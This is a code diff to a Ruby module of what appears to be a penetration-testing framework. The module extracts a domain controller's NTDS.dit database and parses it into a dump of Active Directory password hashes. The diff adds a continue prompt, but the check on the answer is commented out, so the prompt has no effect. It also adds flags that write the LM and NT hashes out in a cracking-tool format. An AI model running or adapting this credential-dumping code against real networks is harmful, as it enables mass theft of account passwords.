@@ -208,40 +208,48 @@ class Hashesdc < Poet::Scanner
 							# Cleanup and return if there was a failure
 							return nil if cleanup
 
-							print_status("Exporting NTDS file contents, this might take a while...")
+							# Give users a chance to do it manually later since it can take multiple hours to complete
+							@extract_ntds = ''
+							until @extract_ntds.eql? 'y' or @extract_ntds.eql? 'n'
+								print_status ("Extraction can take mutiple hours, do you want to continue the process? [#{color_banner('y')}|#{color_banner('n')}]")
+								@extract_ntds = rgets.downcase
+							end
 
-							esedump_cmd = "#{Menu.extbin[:esedbexport]} -l #{@log}/hashes/#{host}/esedbexport.log -t #{local_drop}/ntds.dit #{local_drop}/#{ntds_filename}"
-							esedump = log(esedump_cmd) { `#{esedump_cmd}` }
+							#if @extract_ntds.eql? 'y'
+								print_status("Exporting NTDS file contents, this might take a while...")
+	
+								esedump_cmd = "#{Menu.extbin[:esedbexport]} -l #{@log}/hashes/#{host}/esedbexport.log -t #{local_drop}/ntds.dit #{local_drop}/#{ntds_filename}"
+								esedump = log(esedump_cmd) { `#{esedump_cmd}` }
 
-							# If export worked
-							if esedump =~ /Export completed\./
-								print_status("Parsing ntds.dit file...")
+								# If export worked
+								if esedump =~ /Export completed\./
+									print_status("Parsing ntds.dit file...")
 
-								# Get filenames
-								datatable = /Exporting table (\d) \(datatable\) out of \d+\./.match(esedump)[1]
-								linktable = /Exporting table (\d) \(link_table\) out of \d+\./.match(esedump)[1]
-								datatable = "#{local_drop}/ntds.dit\.export/datatable\.#{datatable.to_i - 1}"
-								linktable = "#{local_drop}/ntds.dit\.export/link_table\.#{linktable.to_i - 1}"
+									# Get filenames
+									datatable = /Exporting table (\d) \(datatable\) out of \d+\./.match(esedump)[1]
+									linktable = /Exporting table (\d) \(link_table\) out of \d+\./.match(esedump)[1]
+									datatable = "#{local_drop}/ntds.dit\.export/datatable\.#{datatable.to_i - 1}"
+									linktable = "#{local_drop}/ntds.dit\.export/link_table\.#{linktable.to_i - 1}"
 								
-								dsusers = ''
-								capture_stderr {
-								# Parse with dsusers
-									dsusers = `python #{Menu.extbin[:dsusers]} #{datatable} #{linktable} --passwordhashes #{local_drop}/#{sys_filename} --passwordhistory #{local_drop}/#{sys_filename}`
-								}
-								# Write output to temp file, doesn't currently support stdin
-								begin
-									File.open("#{local_drop}/dsusers.txt", 'w') { |file| file.write(dsusers) }
-								rescue
-									print_bad("Could not write to #{local_drop}/dsusers.txt")
-									return nil
-								end
-								ntdspwdump = `python #{Menu.extbin[:ntdspwdump]} #{local_drop}/dsusers.txt`
+									dsusers = ''
+									capture_stderr {
+									# Parse with dsusers
+										dsusers = `python #{Menu.extbin[:dsusers]} #{datatable} #{linktable} --passwordhashes #{local_drop}/#{sys_filename} --passwordhistory #{local_drop}/#{sys_filename} --pwdformat ocl --lmoutfile #{host}.lm --ntoutfile #{host}.nt`
+									}
+									# Write output to temp file, doesn't currently support stdin
+									begin
+										File.open("#{local_drop}/dsusers.txt", 'w') { |file| file.write(dsusers) }
+									rescue
+										print_bad("Could not write to #{local_drop}/dsusers.txt")
+										return nil
+									end
+									ntdspwdump = `python #{Menu.extbin[:ntdspwdump]} #{local_drop}/dsusers.txt`
 
-								# Write final output to file 									
-								@parsed_hashes =  "#{@log}/hashes/#{host}_DC_dump.txt"
+									# Write final output to file 									
+									@parsed_hashes =  "#{@log}/hashes/#{host}_DC_dump.txt"
 
-								# If results aren't nil
-								if ntdspwdump
+									# If results aren't nil
+									if ntdspwdump
 									print_status("Removing blank hashes...")
 									
 									# Remove lines that contain emtpy hashes
@@ -292,7 +300,7 @@ class Hashesdc < Poet::Scanner
 			return nil
 		end
 	end
-
+#end
 	# Print progress on download
 	def progress(size, file)
 		print '.'
